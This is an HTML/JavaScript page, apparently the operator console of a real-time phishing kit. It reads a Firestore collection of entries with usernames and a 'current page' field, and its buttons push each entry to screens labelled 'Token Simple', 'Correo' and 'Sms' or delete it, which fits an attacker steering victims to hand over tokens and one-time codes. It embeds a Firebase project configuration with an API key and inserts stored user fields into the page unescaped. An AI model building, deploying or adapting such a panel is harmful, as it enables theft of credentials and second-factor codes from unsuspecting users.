<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Firestore Panel</title>

  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
    integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous" />
  <style>
    body {
      font-family: Arial, sans-serif;
      padding: 20px;
    }

    #data {
      margin-top: 20px;
    }

    .document {
      border: 1px solid #ccc;
      padding: 10px;
      margin-bottom: 10px;
    }

    .document p {
      margin: 5px 0;
    }
  </style>
</head>

<body>
  <div class="container">
    <h1 class="text-center my-4">Firestore Panel</h1>
    <div id="data" class="row"></div>
  </div>

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.6.8/firebase-firestore.js"></script>

  <script>
    // Configuración de Firebase
    const firebaseConfig = {
      apiKey: "AIzaSyDkFiTElkEcL0B1eAtRrrCoGm9HCt9EGZc",
      authDomain: "flab-d70ab.firebaseapp.com",
      databaseURL: "https://flab-d70ab-default-rtdb.firebaseio.com",
      projectId: "flab-d70ab",
      storageBucket: "flab-d70ab.appspot.com",
      messagingSenderId: "789535969500",
      appId: "1:789535969500:web:ff0f3be7c250dac33ee419"
    };

    // Inicializar Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // Mostrar documentos en la página
    function displayData(docs) {
      const dataDiv = document.getElementById("data");
      dataDiv.innerHTML = "";

      docs.forEach((doc) => {
        const docData = doc.data();
        const docDiv = document.createElement("div");
        docDiv.className = "col-md-4 document";

        docDiv.innerHTML = `
          <div class="card">
            <div class="card-body">
              <h5 class="card-title"><strong>ID:</strong> ${doc.id}</h5>
              <p><strong>Usuario:</strong> ${docData.username || 'Sin nombre'}</p>
              <p><strong>Página actual:</strong> ${docData.page || '-'}</p>
              <button class="btn btn-danger btn-sm mt-3" onclick="deleteDocument('${doc.id}')">Eliminar</button>
              <button class="btn btn-primary btn-sm mt-3" onclick="changePage('${doc.id}', 3)">Token Simple</button>
              <button class="btn btn-info btn-sm mt-3" onclick="changePage('${doc.id}', 5)">Correo</button>
              <button class="btn btn-secondary btn-sm mt-3" onclick="changePage('${doc.id}', 4)">Sms</button>
              <button class="btn btn-secondary btn-sm mt-3" onclick="changePage('${doc.id}', 6)">Inicio</button>
            </div>
          </div>
        `;
        dataDiv.appendChild(docDiv);
      });
    }

    // Escuchar documentos en tiempo real (ordenados por fecha desc)
    db.collection("varable")
      .orderBy("timestamp", "desc")
      .onSnapshot((snapshot) => {
        displayData(snapshot.docs);
      });

    // Cambiar página de un documento
    function changePage(id, pageNumber) {
      db.collection("varable").doc(id).update({ page: pageNumber })
        .then(() => console.log(`Página cambiada a ${pageNumber} para el documento ${id}`))
        .catch((error) => console.error("Error cambiando la página:", error));
    }

    // Eliminar un documento
    function deleteDocument(id) {
      db.collection("varable").doc(id).delete()
        .then(() => console.log("Documento eliminado:", id))
        .catch((error) => console.error("Error eliminando documento:", error));
    }
  </script>

  <!-- Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
    crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
    crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
    crossorigin="anonymous"></script>
</body>

</html>
